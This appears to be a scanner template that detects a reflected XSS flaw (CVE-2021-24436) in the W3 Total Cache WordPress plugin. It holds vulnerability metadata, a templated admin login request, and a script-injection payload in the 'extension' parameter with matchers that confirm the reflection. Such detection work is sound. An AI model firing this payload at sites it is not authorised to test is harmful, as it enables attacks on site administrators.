id: CVE-2021-24436

info:
  name: W3 Total Cache < 2.1.3 - Reflected XSS in Extensions Page
  author: theamanrawat
  severity: medium
  description: |
    The W3 Total Cache WordPress plugin before 2.1.4 was vulnerable to a reflected Cross-Site Scripting (XSS) security vulnerability within the "extension" parameter in the Extensions dashboard, which is output in an attribute without being escaped first. This could allow an attacker, who can convince an authenticated admin into clicking a link, to run malicious JavaScript within the user's web browser, which could lead to full site compromise.
  reference:
    - https://wpscan.com/vulnerability/3e855e09-056f-45b5-89a9-d644b7d8c9d0
    - https://wordpress.org/plugins/w3-total-cache/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24436
    - https://wpscan.com/vulnerability/05988ebb-7378-4a3a-9d2d-30f8f58fe9ef
  remediation: Fixed in version 2.1.4
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24436
    cwe-id: CWE-79
  metadata:
    verified: "true"
  tags: cve,cve2021,xss,wpscan,wordpress,wp-plugin,wp,w3-total-cache,authenticated

requests:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        GET /wp-admin/admin.php?page=w3tc_extensions&extension="%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - status_code_2 == 200
          - contains(body_2, '><script>alert(document.domain)</script>&action=view')
          - contains(all_headers_2, "text/html")
        condition: and
